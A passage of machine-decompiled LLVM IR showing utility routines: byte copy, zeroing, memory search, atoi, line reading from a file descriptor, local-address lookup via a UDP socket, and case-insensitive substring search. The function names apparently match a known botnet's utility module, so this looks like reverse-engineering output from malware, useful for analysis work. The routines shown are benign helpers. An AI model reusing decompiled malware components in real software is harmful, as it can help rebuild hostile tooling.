  %v0_11a10 = phi i32 [ %v1_11a18, %dec_label_pc_11a10 ], [ 0, %entry ]
  %v2_11a10 = add i32 %v0_11a10, %arg2
  %v3_11a10 = inttoptr i32 %v2_11a10 to i8*
  %v4_11a10 = load i8, i8* %v3_11a10, align 1
  %v4_11a14 = add i32 %v0_11a10, %arg1
  %v5_11a14 = inttoptr i32 %v4_11a14 to i8*
  store i8 %v4_11a10, i8* %v5_11a14, align 1
  %v0_11a18 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a18 = add i32 %v0_11a18, 1
  store i32 %v1_11a18, i32* %ip.global-to-local, align 4
  %v9_11a1c = icmp eq i32 %v1_11a18, %arg3
  br i1 %v9_11a1c, label %dec_label_pc_11a24, label %dec_label_pc_11a10

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a10
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_11a18, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_11a28 = load i32, i32* @r1, align 4
  %v2_11a28 = icmp eq i32 %v0_11a28, 0
  %v0_11a2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11a28, i32 %v0_11a2c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a34, %entry
  %v2_11a38 = phi i32 [ %v1_11a3c, %dec_label_pc_11a34 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_11a38 = load i32, i32* @r0, align 4
  %v4_11a38 = add i32 %v3_11a38, %v2_11a38
  %v5_11a38 = inttoptr i32 %v4_11a38 to i8*
  store i8 0, i8* %v5_11a38, align 1
  %v0_11a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_11a3c = add i32 %v0_11a3c, 1
  store i32 %v1_11a3c, i32* %r2.global-to-local, align 4
  %v1_11a40 = load i32, i32* @r1, align 4
  %v9_11a40 = icmp eq i32 %v1_11a3c, %v1_11a40
  br i1 %v9_11a40, label %dec_label_pc_11a48, label %dec_label_pc_11a34

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a34
  %v1_11a48 = load i32, i32* @r0, align 4
  ret i32 %v1_11a48

; uselistorder directives
  uselistorder i32 %v1_11a3c, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_11a60 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_11a60, label %dec_label_pc_11a68, label %dec_label_pc_11a70

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a84, %dec_label_pc_11a70, %entry, %dec_label_pc_11ab0
  %storemerge = phi i32 [ %v1_11ab0, %dec_label_pc_11ab0 ], [ -1, %entry ], [ -1, %dec_label_pc_11a70 ], [ -1, %dec_label_pc_11a84 ]
  ret i32 %storemerge

dec_label_pc_11a70:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_11a68, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a70
  br label %dec_label_pc_11a90

dec_label_pc_11a84:                               ; preds = %bb, %dec_label_pc_11aa4
  %v1_11a903 = phi i32 [ %v1_11aa4, %dec_label_pc_11aa4 ], [ 0, %bb ]
  %v1_11a84 = add i32 %v0_11ab0, 1
  %v9_11a88 = icmp eq i32 %v1_11a84, %arg2
  br i1 %v9_11a88, label %dec_label_pc_11a68, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a84, %dec_label_pc_11a78
  %v0_11ab0 = phi i32 [ %v1_11a84, %dec_label_pc_11a84 ], [ 0, %dec_label_pc_11a78 ]
  %v1_11a90 = phi i32 [ %v1_11a903, %dec_label_pc_11a84 ], [ 0, %dec_label_pc_11a78 ]
  %v2_11a90 = add i32 %v1_11a90, %arg3
  %v3_11a90 = inttoptr i32 %v2_11a90 to i8*
  %v4_11a90 = load i8, i8* %v3_11a90, align 1
  %v2_11a94 = add i32 %v0_11ab0, %arg1
  %v3_11a94 = inttoptr i32 %v2_11a94 to i8*
  %v4_11a94 = load i8, i8* %v3_11a94, align 1
  %v9_11a98 = icmp eq i8 %v4_11a94, %v4_11a90
  br i1 %v9_11a98, label %dec_label_pc_11aa4, label %bb

bb:                                               ; preds = %dec_label_pc_11a90
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11a84

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a90
  %v1_11aa4 = add i32 %v1_11a90, 1
  store i32 %v1_11aa4, i32* @ip, align 4
  %v9_11aa8 = icmp eq i32 %v1_11aa4, %arg4
  br i1 %v9_11aa8, label %dec_label_pc_11ab0, label %dec_label_pc_11a84

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11aa4
  %v1_11ab0 = add i32 %v0_11ab0, 1
  br label %dec_label_pc_11a68

; uselistorder directives
  uselistorder i32 %v1_11aa4, { 1, 2, 0 }
  uselistorder i32 %v1_11a90, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11a84, { 1, 0 }
  uselistorder label %dec_label_pc_11a68, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %.thread, %dec_label_pc_11adc, %bb, %entry
  %v0_11ac8 = phi i32 [ %tmp, %entry ], [ %v5_11ac8, %bb ], [ %v5_11ac8, %dec_label_pc_11adc ], [ %v5_11ac8, %.thread ]
  %v1_11ac8 = inttoptr i32 %v0_11ac8 to i8*
  %v2_11ac8 = load i8, i8* %v1_11ac8, align 1
  %v5_11ac8 = add i32 %v0_11ac8, 1
  %v7_11acc = icmp eq i8 %v2_11ac8, 9
  br i1 %v7_11acc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11ac8
  br label %dec_label_pc_11ac8

bb:                                               ; preds = %dec_label_pc_11ac8
  %v8_11ad0 = icmp eq i8 %v2_11ac8, 32
  br i1 %v8_11ad0, label %dec_label_pc_11ac8, label %dec_label_pc_11adc

dec_label_pc_11adc:                               ; preds = %bb
  %v7_11adc = icmp eq i8 %v2_11ac8, 10
  br i1 %v7_11adc, label %dec_label_pc_11ac8, label %dec_label_pc_11ae4

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11adc
  %v7_11ae4 = icmp eq i8 %v2_11ac8, 45
  br i1 %v7_11ae4, label %dec_label_pc_11bd4, label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ae4
  %v7_11aec = icmp eq i8 %v2_11ac8, 43
  br i1 %v7_11aec, label %bb54, label %dec_label_pc_11afc

bb54:                                             ; preds = %dec_label_pc_11aec
  %v2_11af0 = inttoptr i32 %v5_11ac8 to i8*
  %v3_11af0 = load i8, i8* %v2_11af0, align 1
  %v6_11af0 = add i32 %v0_11ac8, 2
  br label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %bb54, %dec_label_pc_11aec, %dec_label_pc_11bd4
  %v1_11ba439 = phi i32 [ %v5_11bd4, %dec_label_pc_11bd4 ], [ %v5_11ac8, %dec_label_pc_11aec ], [ %v6_11af0, %bb54 ]
  %v0_11b2410.in = phi i8 [ %v2_11bd4, %dec_label_pc_11bd4 ], [ %v2_11ac8, %dec_label_pc_11aec ], [ %v3_11af0, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11bd4 ], [ 2147483647, %dec_label_pc_11aec ], [ 2147483647, %bb54 ]
  %v0_11be4 = phi i32 [ 1, %dec_label_pc_11bd4 ], [ 0, %dec_label_pc_11aec ], [ 0, %bb54 ]
  %v2_11b04 = udiv i32 %storemerge1, %arg2
  %v3_11b04 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_11b24.outer

dec_label_pc_11b24.outer:                         ; preds = %.thread5, %dec_label_pc_11afc
  %v1_11ba4.ph = phi i32 [ %v6_11ba4, %.thread5 ], [ %v1_11ba439, %dec_label_pc_11afc ]
  %v2_11ba0.ph = phi i32 [ %v5_11ba0, %.thread5 ], [ 0, %dec_label_pc_11afc ]
  %v1_11b64.ph.in = phi i8 [ %v3_11ba4, %.thread5 ], [ %v0_11b2410.in, %dec_label_pc_11afc ]
  %v1_11b7c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_11afc ]
  %v3_11b70 = icmp uge i32 %v2_11ba0.ph, %v2_11b04
  %v9_11b70 = icmp eq i32 %v2_11ba0.ph, %v2_11b04
  %v2_11b74 = xor i1 %v3_11b70, true
  %v3_11b74 = or i1 %v9_11b70, %v2_11b74
  %v2_11b78 = xor i1 %v9_11b70, true
  %v3_11b78 = and i1 %v3_11b70, %v2_11b78
  %v2_11b98 = icmp eq i1 %v9_11b70, false
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b24.outer, %dec_label_pc_11bac
  %v1_11ba4 = phi i32 [ %v5_11bac, %dec_label_pc_11bac ], [ %v1_11ba4.ph, %dec_label_pc_11b24.outer ]
  %v1_11b7c = phi i32 [ -1, %dec_label_pc_11bac ], [ %v1_11b7c.ph, %dec_label_pc_11b24.outer ]
  %v1_11b64.in = phi i8 [ %v2_11bac, %dec_label_pc_11bac ], [ %v1_11b64.ph.in, %dec_label_pc_11b24.outer ]
  %v1_11b64 = zext i8 %v1_11b64.in to i32
  %v1_11b24 = urem i32 %v1_11b64, 256
  %v1_11b28 = add nsw i32 %v1_11b24, -48
  %v1_11b30 = add nsw i32 %v1_11b24, -97
  %v1_11b34 = add nsw i32 %v1_11b64, -48
  %v1_11b38 = add nsw i32 %v1_11b24, -65
  %tmp87 = icmp ult i32 %v1_11b28, 10
  br i1 %tmp87, label %dec_label_pc_11b68, label %dec_label_pc_11b40

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b24
  %v2_11b40 = icmp ugt i32 %v1_11b38, 24
  %v7_11b40 = icmp eq i32 %v1_11b38, 25
  %v2_11b44 = xor i1 %v7_11b40, true
  %v3_11b44 = and i1 %v2_11b40, %v2_11b44
  br i1 %v3_11b44, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_11b40
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_11b40, %bb55
  %v0_11b5815 = phi i32 [ %v1_11b34, %dec_label_pc_11b40 ], [ 0, %bb55 ]
  %v2_11b48 = xor i1 %v2_11b40, true
  %v3_11b48 = or i1 %v7_11b40, %v2_11b48
  br i1 %v3_11b48, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11b58 = phi i32 [ %v0_11b5815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11b44, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_11b50 = icmp ugt i32 %v1_11b30, 24
  %v11_11b50 = icmp eq i32 %v1_11b30, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_11b54 = phi i1 [ %v7_11b40, %bb58 ], [ %v11_11b50, %bb59 ]
  %v0_11b54 = phi i1 [ %v2_11b40, %bb58 ], [ %v6_11b50, %bb59 ]
  %v2_11b54 = xor i1 %v1_11b54, true
  %v3_11b54 = and i1 %v0_11b54, %v2_11b54
  br i1 %v3_11b54, label %dec_label_pc_11bb8, label %dec_label_pc_11b58

dec_label_pc_11b58:                               ; preds = %bb60
  %v2_11b58 = icmp eq i32 %v0_11b58, 0
  %. = select i1 %v2_11b58, i32 87, i32 55
  %v2_11b64 = sub nsw i32 %v1_11b64, %.
  br label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b24, %dec_label_pc_11b58
  %v0_11b7c33 = phi i32 [ %v1_11b38, %dec_label_pc_11b24 ], [ %., %dec_label_pc_11b58 ]
  %v3_11ba0 = phi i32 [ %v1_11b34, %dec_label_pc_11b24 ], [ %v2_11b64, %dec_label_pc_11b58 ]
  %v2_11b68 = sub i32 %v3_11ba0, %arg2
  %v4_11b68 = xor i32 %v3_11ba0, %arg2
  %v5_11b68 = xor i32 %v2_11b68, %v3_11ba0
  %v6_11b68 = and i32 %v5_11b68, %v4_11b68
  %v7_11b68 = icmp slt i32 %v6_11b68, 0
  %v8_11b68 = icmp slt i32 %v2_11b68, 0
  %v2_11b6c = xor i1 %v8_11b68, %v7_11b68
  br i1 %v2_11b6c, label %dec_label_pc_11b70, label %dec_label_pc_11bb8

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b68
  br i1 %v3_11b74, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_11b70
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_11b70, %bb63
  %v0_11b7c32 = phi i32 [ %v0_11b7c33, %dec_label_pc_11b70 ], [ 0, %bb63 ]
  br i1 %v3_11b78, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11b7c = phi i32 [ %v0_11b7c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_11b7c, 0
  %v4_11b7c = zext i1 %tmp88 to i32
  %v5_11b7c = or i32 %v0_11b7c, %v4_11b7c
  %v7_11b7c = icmp eq i32 %v5_11b7c, 0
  br i1 %v7_11b7c, label %dec_label_pc_11b84, label %dec_label_pc_11bac

dec_label_pc_11b84:                               ; preds = %bb66
  %v2_11b90 = sub i32 %v3_11ba0, %v3_11b04
  %v4_11b90 = xor i32 %v3_11ba0, %v3_11b04
  %v5_11b90 = xor i32 %v2_11b90, %v3_11ba0
  %v6_11b90 = and i32 %v5_11b90, %v4_11b90
  %v7_11b90 = icmp slt i32 %v6_11b90, 0
  %v8_11b90 = icmp slt i32 %v2_11b90, 0
  %v9_11b90 = icmp eq i32 %v3_11ba0, %v3_11b04
  %v3_11b94 = xor i1 %v8_11b90, %v7_11b90
  %v4_11b94 = or i1 %v9_11b90, %v3_11b94
  br i1 %v4_11b94, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_11b84
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_11b84
  br i1 %v2_11b98, label %.thread5, label %dec_label_pc_11bac

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_11ba0 = mul i32 %v2_11ba0.ph, %arg2
  %v5_11ba0 = add i32 %v3_11ba0, %v4_11ba0
  %v2_11ba4 = inttoptr i32 %v1_11ba4 to i8*
  %v3_11ba4 = load i8, i8* %v2_11ba4, align 1
  %v6_11ba4 = add i32 %v1_11ba4, 1
  br label %dec_label_pc_11b24.outer

dec_label_pc_11bac:                               ; preds = %thread-pre-split, %bb66
  %v1_11bac = inttoptr i32 %v1_11ba4 to i8*
  %v2_11bac = load i8, i8* %v1_11bac, align 1
  %v5_11bac = add i32 %v1_11ba4, 1
  br label %dec_label_pc_11b24

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b68, %bb60
  %v1_11bb8 = icmp slt i32 %v1_11b7c, 0
  %v2_11be4 = icmp eq i32 %v0_11be4, 0
  br i1 %v1_11bb8, label %dec_label_pc_11be4, label %dec_label_pc_11bc0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb8
  br i1 %v2_11be4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_11bc0
  %v2_11bc4 = sub i32 0, %v2_11ba0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_11bc0, %bb69
  %v1_11bd0 = phi i32 [ -2147483648, %bb71 ], [ %v2_11ba0.ph, %dec_label_pc_11bc0 ], [ %v2_11bc4, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_11bd0

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11ae4
  %v1_11bd4 = inttoptr i32 %v5_11ac8 to i8*
  %v2_11bd4 = load i8, i8* %v1_11bd4, align 1
  %v5_11bd4 = add i32 %v0_11ac8, 2
  br label %dec_label_pc_11afc

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11bb8
  br i1 %v2_11be4, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_11be4
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_11be4
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_11be4, { 1, 0 }
  uselistorder i32 %v2_11b90, { 1, 0 }
  uselistorder i32 %v2_11b68, { 1, 0 }
  uselistorder i32 %v3_11ba0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_11b40, { 1, 2, 0 }
  uselistorder i1 %v2_11b40, { 1, 0, 2 }
  uselistorder i32 %v1_11b24, { 1, 2, 0 }
  uselistorder i32 %v1_11b64, { 1, 0, 2 }
  uselistorder i32 %v1_11b7c, { 1, 0 }
  uselistorder i32 %v1_11ba4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_11b70, { 1, 0, 2 }
  uselistorder i1 %v3_11b70, { 1, 0 }
  uselistorder i32 %v2_11ba0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_11b04, { 1, 0, 2 }
  uselistorder i32 %v2_11b04, { 1, 0 }
  uselistorder i32 %v5_11ac8, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_11ac8, { 0, 1, 3, 2 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder i32 25, { 21, 22, 5, 12, 2, 11, 3, 13, 4, 14, 10, 15, 6, 16, 0, 17, 7, 8, 18, 9, 19, 1, 20 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11b68, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11b24, { 1, 0 }
  uselistorder label %dec_label_pc_11afc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ac8, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11bf4 = load i32, i32* @r4, align 4
  store i32 %v3_11bf4, i32* %stack_var_-24, align 4
  %v6_11bf4 = load i32, i32* @r5, align 4
  %v9_11bf4 = load i32, i32* @r6, align 4
  %v12_11bf4 = load i32, i32* @r7, align 4
  %v15_11bf4 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11c30.dec_label_pc_11c0c_crit_edge, %entry
  %v0_11c10 = phi i32 [ %v0_11c10.pre, %dec_label_pc_11c30.dec_label_pc_11c0c_crit_edge ], [ %arg3, %entry ]
  %v0_11c0c = phi i32 [ %v5_11c30, %dec_label_pc_11c30.dec_label_pc_11c0c_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_11c0c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_11c18 = call i32 @__libc_read(i32 %v0_11c10)
  %v7_11c1c = icmp eq i32 %v1_11c18, 1
  %v0_11c24 = load i32, i32* @r5, align 4
  br i1 %v7_11c1c, label %dec_label_pc_11c24, label %dec_label_pc_11c3c

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c0c
  %v1_11c24 = add i32 %v0_11c24, 1
  store i32 %v1_11c24, i32* @r5, align 4
  %v1_11c28 = load i32, i32* @r8, align 4
  %v6_11c2c = icmp slt i32 %v1_11c24, %v1_11c28
  br i1 %v6_11c2c, label %dec_label_pc_11c30, label %.loopexit

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c24
  %v0_11c30 = load i32, i32* @r4, align 4
  %v1_11c30 = inttoptr i32 %v0_11c30 to i8*
  %v2_11c30 = load i8, i8* %v1_11c30, align 1
  %v3_11c30 = zext i8 %v2_11c30 to i32
  store i32 %v3_11c30, i32* @r3, align 4
  %v5_11c30 = add i32 %v0_11c30, 1
  store i32 %v5_11c30, i32* @r4, align 4
  %v7_11c34 = icmp eq i8 %v2_11c30, 10
  br i1 %v7_11c34, label %dec_label_pc_11c3c, label %dec_label_pc_11c30.dec_label_pc_11c0c_crit_edge

dec_label_pc_11c30.dec_label_pc_11c0c_crit_edge:  ; preds = %dec_label_pc_11c30
  %v0_11c10.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11c0c

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c30
  %v0_11c3c = phi i32 [ %v1_11c24, %dec_label_pc_11c30 ], [ %v0_11c24, %dec_label_pc_11c0c ]
  %v2_11c3c = icmp eq i32 %v0_11c3c, 0
  br i1 %v2_11c3c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_11c3c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_11c24, %dec_label_pc_11c3c, %bb
  %v0_11c44 = load i32, i32* @r7, align 4
  %v2_11c48 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11c48, i32* @r4, align 4
  store i32 %v6_11bf4, i32* @r5, align 4
  store i32 %v9_11bf4, i32* @r6, align 4
  store i32 %v12_11bf4, i32* @r7, align 4
  store i32 %v15_11bf4, i32* @r8, align 4
  ret i32 %v0_11c44

; uselistorder directives
  uselistorder i32 %v5_11c30, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11c3c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11c50 = load i32, i32* @r4, align 4
  %v6_11c50 = load i32, i32* @r5, align 4
  %v9_11c50 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_11c60 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11c68 = inttoptr i32 %v0_11c60 to i32*
  store i32 0, i32* %v2_11c68, align 4
  %v0_11c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c78 = call i32 @socket(i32 2, i32 2, i32 %v0_11c74)
  %v7_11c7c = icmp eq i32 %v3_11c78, -1
  store i32 %v3_11c78, i32* @r5, align 4
  br i1 %v7_11c7c, label %bb, label %dec_label_pc_11c8c

bb:                                               ; preds = %entry
  %v1_11c84 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11c8c:                               ; preds = %entry
  %v2_11c98 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11c98, i32* @r4, align 4
  %v0_11ca4 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_11cb8 = call i32 @__libc_connect(i32 %v3_11c78, i32 %v2_11c98, i32 %v0_11ca4)
  store i32 %v2_11c98, i32* @r1, align 4
  %v2_11cc0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_11cc4 = load i32, i32* @r5, align 4
  %v3_11cc8 = call i32 @__GI_getsockname(i32 %v0_11cc4, i32 %v2_11c98, i32 %v2_11cc0)
  %v0_11ccc = load i32, i32* @r5, align 4
  %v1_11cd0 = call i32 @__GI___libc_close(i32 %v0_11ccc)
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %bb, %dec_label_pc_11c8c
  %storemerge = phi i32 [ 134744072, %dec_label_pc_11c8c ], [ %v1_11c84, %bb ]
  store i32 %v3_11c50, i32* @r4, align 4
  store i32 %v6_11c50, i32* @r5, align 4
  store i32 %v9_11c50, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11c98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11c78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 22, 23, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 5, 1, 4, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11cd8, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_11ce8 = load i8, i8* %tmp, align 1
  %v4_11ce8 = zext i8 %v3_11ce8 to i32
  store i32 %v4_11ce8, i32* @r3, align 4
  %v2_11cec = icmp eq i8 %v3_11ce8, 0
  br i1 %v2_11cec, label %bb, label %dec_label_pc_11d00

bb:                                               ; preds = %entry
  br label %dec_label_pc_11d14

dec_label_pc_11d00:                               ; preds = %entry
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11d04, %dec_label_pc_11d00
  %v0_11d04 = phi i32 [ %v1_11d04, %dec_label_pc_11d04 ], [ 0, %dec_label_pc_11d00 ]
  %v1_11d04 = add i32 %v0_11d04, 1
  %v2_11d08 = add i32 %v1_11d04, %arg2
  %v3_11d08 = inttoptr i32 %v2_11d08 to i8*
  %v4_11d08 = load i8, i8* %v3_11d08, align 1
  %v6_11d08 = zext i8 %v4_11d08 to i32
  store i32 %v6_11d08, i32* @r3, align 4
  %v2_11d0c = icmp eq i8 %v4_11d08, 0
  br i1 %v2_11d0c, label %dec_label_pc_11d14, label %dec_label_pc_11d04

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11d04, %bb
  %v0_11d5821 = phi i32 [ %v4_11ce8, %bb ], [ %v1_11d04, %dec_label_pc_11d04 ]
  %v0_11d1c2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_11d1c2, 1
  br i1 %tmp29, label %dec_label_pc_11d6c, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d14, %dec_label_pc_11d1c.backedge
  %v0_11d20.in = phi i32 [ %v0_11d20, %dec_label_pc_11d1c.backedge ], [ %v0_11d1c2, %dec_label_pc_11d14 ]
  %v1_11d34 = phi i32 [ %v1_11d3415, %dec_label_pc_11d1c.backedge ], [ 0, %dec_label_pc_11d14 ]
  %v0_11d28 = phi i32 [ %v5_11d28, %dec_label_pc_11d1c.backedge ], [ %tmp23, %dec_label_pc_11d14 ]
  %v0_11d20 = add i32 %v0_11d20.in, -1
  %v1_11d28 = inttoptr i32 %v0_11d28 to i8*
  %v2_11d28 = load i8, i8* %v1_11d28, align 1
  %v3_11d28 = zext i8 %v2_11d28 to i32
  %v5_11d28 = add i32 %v0_11d28, 1
  %v1_11d2c = add nsw i32 %v3_11d28, -65
  %v2_11d34 = add i32 %v1_11d34, %arg2
  %v3_11d34 = inttoptr i32 %v2_11d34 to i8*
  %v4_11d34 = load i8, i8* %v3_11d34, align 1
  %v6_11d34 = zext i8 %v4_11d34 to i32
  store i32 %v6_11d34, i32* @r3, align 4
  %v1_11d38 = add nsw i32 %v6_11d34, -65
  %tmp38 = icmp ult i32 %v1_11d2c, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_11d28
  %v5_11d3c = or i32 %v3_11d28, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11d28, %bb30
  %v0_11d48 = phi i32 [ %v3_11d28, %dec_label_pc_11d28 ], [ %v5_11d3c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_11d38, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_11d44 = or i32 %v6_11d34, 96
  store i32 %v5_11d44, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_11d48 = phi i32 [ %v6_11d34, %bb31 ], [ %v5_11d44, %bb32 ]
  %v9_11d48 = icmp eq i32 %v0_11d48, %v1_11d48
  br i1 %v9_11d48, label %dec_label_pc_11d54, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_11d1c.backedge

dec_label_pc_11d1c.backedge:                      ; preds = %bb34, %dec_label_pc_11d54
  %v1_11d3415 = phi i32 [ 0, %bb34 ], [ %v1_11d54, %dec_label_pc_11d54 ]
  %tmp35 = icmp slt i32 %v0_11d20, 1
  br i1 %tmp35, label %dec_label_pc_11d6c, label %dec_label_pc_11d28

dec_label_pc_11d54:                               ; preds = %bb33
  %v1_11d54 = add i32 %v1_11d34, 1
  %v9_11d58 = icmp eq i32 %v0_11d5821, %v1_11d54
  br i1 %v9_11d58, label %dec_label_pc_11d60, label %dec_label_pc_11d1c.backedge

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d54
  %v2_11d60 = sub i32 %v5_11d28, %tmp23
  br label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d1c.backedge, %dec_label_pc_11d14, %dec_label_pc_11d60
